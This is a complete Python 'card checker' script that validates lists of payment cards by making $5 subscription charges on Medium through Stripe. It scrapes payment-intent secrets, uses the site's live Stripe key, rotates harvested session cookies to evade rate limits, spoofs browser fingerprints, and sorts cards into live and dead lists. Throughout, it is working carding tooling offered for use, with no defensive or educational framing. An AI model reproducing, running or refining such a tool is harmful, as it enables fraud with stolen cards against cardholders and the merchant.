"""
Medium.com Card Checker for Pydroid3
Full $5 Charge Gate with Multiple Cookie Rotation
Auto-detects cookies from pasted code blocks
"""

import requests
import random
import string
import uuid
import time
import os
import re
import json

# ============ CONFIGURATION ============
INPUT_FILE = "cards.txt"
COOKIE_FILE = "cookies.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3  # Delay between checks (seconds)
# =======================================

def generate_guid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_muid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_sid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def get_bin_info(cc):
    """Get BIN information"""
    try:
        bin_code = cc[:6]
        r = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=10)
        if r.status_code == 200:
            data = r.json()
            vendor = data.get('scheme', 'Unknown').upper()
            card_type = data.get('type', 'Unknown').upper()
            level = data.get('brand', 'Unknown').upper()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '')
            return f"{vendor} - {card_type} - {level} | {bank} | {country} {flag}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def extract_cookies_from_block(block):
    """Extract cookies from a cookies = { ... } block"""
    cookies = {}
    
    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]*)['\"]"
    matches = re.findall(pattern, block)
    
    for key, value in matches:
        if key not in ['authority', 'accept', 'accept-language', 'content-type', 
                       'origin', 'referer', 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile',
                       'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 
                       'sec-fetch-site', 'apollographql-client-name', 'apollographql-client-version',
                       'graphql-operation', 'medium-frontend-app', 'medium-frontend-path',
                       'medium-frontend-route', 'operationName', 'query', 'payload']:
            cookies[key] = value
    
    return cookies

def load_all_cookies():
    """Load multiple cookie sets from cookies.txt"""
    
    if not os.path.exists(COOKIE_FILE):
        return []
    
    with open(COOKIE_FILE, 'r') as f:
        content = f.read()
    
    cookie_sets = []
    
    cookie_block_pattern = r'cookies\s*=\s*\{([^}]+)\}'
    matches = re.findall(cookie_block_pattern, content, re.DOTALL)
    
    for match in matches:
        block = '{' + match + '}'
        cookies = extract_cookies_from_block(block)
        
        if cookies and 'uid' in cookies and 'sid' in cookies:
            cookie_sets.append(cookies)
    
    seen = set()
    unique_sets = []
    for cookies in cookie_sets:
        key = cookies.get('uid', '') + cookies.get('sid', '')
        if key and key not in seen:
            seen.add(key)
            unique_sets.append(cookies)
    
    return unique_sets

def get_medium_session(cookies):
    """Create session with Medium cookies"""
    session = requests.Session()
    
    if cookies:
        for name, value in cookies.items():
            session.cookies.set(name, value, domain='.medium.com')
    
    return session

def get_payment_intent_from_page(session, cookies):
    """Get payment intent by visiting the confirmation page"""
    
    headers = {
        'authority': 'medium.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
    }
    
    try:
        # First visit plans page
        r = session.get('https://medium.com/plans', headers=headers, timeout=30)
        
        # Then visit confirmation page for monthly plan
        r = session.get('https://medium.com/plans/confirmation/monthly', headers=headers, timeout=30)
        html = r.text
        
        # Try to find client secret in the page
        # Pattern: pi_xxxxx_secret_xxxxx
        pi_pattern = r'(pi_[a-zA-Z0-9]+)_secret_([a-zA-Z0-9]+)'
        match = re.search(pi_pattern, html)
        
        if match:
            pi_id = match.group(1)
            client_secret = f"{pi_id}_secret_{match.group(2)}"
            return pi_id, client_secret, None
        
        # Try to find in JSON data
        json_pattern = r'"clientSecret"\s*:\s*"(pi_[^"]+)"'
        match = re.search(json_pattern, html)
        
        if match:
            client_secret = match.group(1)
            pi_id = client_secret.split('_secret_')[0]
            return pi_id, client_secret, None
        
        # Try setup intent pattern
        si_pattern = r'(seti_[a-zA-Z0-9]+)_secret_([a-zA-Z0-9]+)'
        match = re.search(si_pattern, html)
        
        if match:
            si_id = match.group(1)
            client_secret = f"{si_id}_secret_{match.group(2)}"
            return si_id, client_secret, None
        
        return None, None, "Could not find payment intent in page"
        
    except Exception as e:
        return None, None, str(e)

def get_payment_intent_graphql(session, cookies):
    """Try different GraphQL mutations to get payment intent"""
    
    headers = {
        'authority': 'medium.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://medium.com',
        'referer': 'https://medium.com/plans/confirmation/monthly',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'apollographql-client-name': 'lite',
        'apollographql-client-version': 'main-20260116-161017-b2412ec54c',
        'medium-frontend-app': 'lite/main-20260116-161017-b2412ec54c',
        'medium-frontend-path': '/plans/confirmation/monthly',
        'medium-frontend-route': 'pay',
    }
    
    xsrf = cookies.get('xsrf', '')
    if xsrf:
        headers['x-xsrf-token'] = xsrf
    
    # Try CreateSubscriptionMutation
    mutations = [
        {
            'operationName': 'CreateSubscriptionMutation',
            'variables': {'planType': 'monthly'},
            'query': '''mutation CreateSubscriptionMutation($planType: String!) {
                createSubscription(planType: $planType) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'StartSubscriptionMutation', 
            'variables': {'plan': 'monthly'},
            'query': '''mutation StartSubscriptionMutation($plan: String!) {
                startSubscription(plan: $plan) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'CreatePaymentIntentMutation',
            'variables': {'planId': 'monthly'},
            'query': '''mutation CreatePaymentIntentMutation($planId: String!) {
                createPaymentIntent(planId: $planId) {
                    clientSecret
                    __typename
                }
            }'''
        }
    ]
    
    for mutation in mutations:
        try:
            r = session.post('https://medium.com/_/graphql', headers=headers, json=mutation, timeout=30)
            data = r.json()
            
            if 'data' in data:
                for key in data['data']:
                    if data['data'][key] and 'clientSecret' in data['data'][key]:
                        client_secret = data['data'][key]['clientSecret']
                        if client_secret:
                            pi_id = client_secret.split('_secret_')[0]
                            return pi_id, client_secret, None
        except:
            continue
    
    return None, None, "GraphQL mutations failed"

def create_payment_method(cc, mes, ano, cvv, muid, sid, guid):
    """Create Stripe payment method"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(random.randint(30000, 60000)),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def confirm_intent(pm_id, intent_id, client_secret):
    """Confirm payment/setup intent to charge the card"""
    
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'return_url': 'https://medium.com/welcome-member',
        'payment_method': pm_id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': client_secret,
    }
    
    # Determine endpoint based on intent type
    if intent_id.startswith('pi_'):
        url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'
    elif intent_id.startswith('seti_'):
        url = f'https://api.stripe.com/v1/setup_intents/{intent_id}/confirm'
    else:
        url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'
    
    try:
        r = requests.post(url, headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def parse_confirm_response(response):
    """Parse payment intent confirm response"""
    
    if 'error' in response:
        error = response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', 'Unknown error')
        
        ccn_codes = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect_zip',
            'insufficient_funds', 'card_velocity_exceeded',
            'do_not_honor', 'generic_decline', 'lost_card',
            'stolen_card', 'pickup_card', 'restricted_card',
            'security_violation', 'service_not_allowed',
            'transaction_not_allowed', 'withdrawal_count_limit_exceeded',
            'try_again_later', 'not_permitted', 'revocation_of_authorization',
            'invalid_amount', 'processing_error', 'reenter_transaction'
        ]
        
        if code == 'authentication_required' or 'authentication' in message.lower() or '3d' in message.lower():
            return 'CCN', '3DS Required'
        
        if code in ccn_codes or decline_code in ccn_codes:
            return 'CCN', f"{decline_code or code}"
        
        if 'expired' in code or 'expired' in decline_code:
            return 'CCN', 'Expired Card'
        
        if 'rate_limit' in code:
            return 'RATE_LIMIT', message
        
        return 'DECLINED', f"{decline_code or code or message}"
    
    status = response.get('status', '')
    
    if status == 'succeeded':
        return 'CHARGED', 'Payment Successful!'
    elif status == 'requires_action':
        next_action = response.get('next_action', {})
        action_type = next_action.get('type', '')
        if 'redirect' in action_type or '3d' in action_type.lower():
            return 'CCN', '3DS Required'
        return 'CCN', f'Requires Action: {action_type}'
    elif status == 'requires_payment_method':
        return 'DECLINED', 'Card Declined'
    elif status == 'processing':
        return 'CHARGED', 'Processing'
    elif status == 'requires_confirmation':
        return 'CCN', 'Requires Confirmation'
    
    return 'UNKNOWN', f"Status: {status}"

def check_card(cookies, cc, mes, ano, cvv):
    """Full card check flow"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    
    session = get_medium_session(cookies)
    
    # Step 1: Get payment intent from page
    intent_id, client_secret, error = get_payment_intent_from_page(session, cookies)
    
    # If page scraping failed, try GraphQL
    if not intent_id:
        intent_id, client_secret, error = get_payment_intent_graphql(session, cookies)
    
    if error and not intent_id:
        return 'ERROR', f"PI Error: {error}"
    
    if not intent_id or not client_secret:
        return 'ERROR', 'Failed to get payment intent'
    
    # Step 2: Create payment method
    pm_response = create_payment_method(cc, mes, ano, cvv, muid, sid, guid)
    
    if 'error' in pm_response:
        error = pm_response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', '')
        
        # Check for CCN responses at PM creation
        ccn_at_pm = ['incorrect_cvc', 'invalid_cvc', 'expired_card', 'insufficient_funds']
        if code in ccn_at_pm or decline_code in ccn_at_pm:
            return 'CCN', f"{decline_code or code}"
        
        if 'invalid' in code.lower() or 'invalid' in message.lower():
            return 'DECLINED', f"Invalid Card: {message}"
        
        return 'DECLINED', f"{decline_code or code or message}"
    
    pm_id = pm_response.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID returned'
    
    # Step 3: Confirm intent
    confirm_response = confirm_intent(pm_id, intent_id, client_secret)
    
    status, message = parse_confirm_response(confirm_response)
    
    return status, message

def save_result(card, status, message):
    """Save card to appropriate file"""
    if status in ['CHARGED', 'CCN']:
        with open(LIVE_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")
    else:
        with open(DEAD_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM.COM CARD CHECKER          ║
    ║         FOR PYDROID3                  ║
    ║   $5 CHARGE - MULTI COOKIE ROTATION   ║
    ╚═══════════════════════════════════════╝
    """)
    
    all_cookies = load_all_cookies()
    
    if not all_cookies:
        print(f"[!] No cookies found in {COOKIE_FILE}!")
        print(f"\n[*] Creating {COOKIE_FILE}...")
        with open(COOKIE_FILE, 'w') as f:
            f.write("""# Just paste your full code blocks here
# The checker will auto-detect cookies = { } blocks

cookies = {
    'uid': 'your_uid_here',
    'sid': 'your_sid_here',
    'xsrf': 'your_xsrf_here',
}
""")
        print(f"[*] Please paste your code blocks to {COOKIE_FILE}")
        return
    
    print(f"[+] Auto-detected {len(all_cookies)} cookie set(s)")
    for i, cookies in enumerate(all_cookies, 1):
        uid = cookies.get('uid', 'N/A')[:10]
        has_xsrf = 'Yes' if cookies.get('xsrf') else 'No'
        print(f"    [{i}] uid: {uid}... | xsrf: {has_xsrf}")
    
    if not os.path.exists(INPUT_FILE):
        print(f"\n[!] {INPUT_FILE} not found!")
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        lines = f.readlines()
    
    cards = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append(line)
    
    if not cards:
        print("[!] No valid cards in cards.txt")
        return
    
    print(f"\n[*] Loaded {len(cards)} cards")
    print(f"[*] Gate: Medium $5 Charge")
    print(f"[*] Cookies: {len(all_cookies)}")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 50)
    
    total = len(cards)
    charged = 0
    ccn = 0
    dead = 0
    errors = 0
    
    cookie_index = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        cc = parts[0].strip()
        mes = parts[1].strip()
        ano = parts[2].strip()
        cvv = parts[3].strip()
        
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        current_cookies = all_cookies[cookie_index]
        cookie_uid = current_cookies.get('uid', 'N/A')[:8]
        
        print(f"\n[{i}/{total}] {cc[:6]}xxxxxx{cc[-4:]} [Cookie: {cookie_uid}...]")
        
        start = time.time()
        status, message = check_card(current_cookies, cc, mes, ano, cvv)
        elapsed = round(time.time() - start, 2)
        
        bin_info = get_bin_info(cc)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {bin_info}")
            charged += 1
            save_result(fullcc, status, message)
            
        elif status == 'CCN':
            print(f"[CCN] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {bin_info}")
            ccn += 1
            save_result(fullcc, status, message)
            
        elif status == 'RATE_LIMIT':
            print(f"[!] Rate Limited")
            cookie_index = (cookie_index + 1) % len(all_cookies)
            time.sleep(5)
            errors += 1
            
        elif status == 'ERROR':
            print(f"[ERROR] {fullcc}")
            print(f"[-] {message}")
            errors += 1
            
            if 'unauthorized' in message.lower() or 'login' in message.lower():
                print(f"[!] Cookie expired!")
                if len(all_cookies) > 1:
                    all_cookies.pop(cookie_index)
                    cookie_index = cookie_index % len(all_cookies)
                else:
                    print("[!] No more cookies!")
                    break
            
        else:
            print(f"[DEAD] {fullcc}")
            print(f"[-] {message}")
            dead += 1
            save_result(fullcc, status, message)
        
        print(f"[*] {elapsed}s")
        
        cookie_index = (cookie_index + 1) % len(all_cookies)
        
        if i < total:
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print("           SUMMARY")
    print("=" * 50)
    print(f"Total:     {total}")
    print(f"Charged:   {charged}")
    print(f"CCN:       {ccn}")
    print(f"Dead:      {dead}")
    print(f"Errors:    {errors}")
    print("=" * 50)

if __name__ == "__main__":
    main()
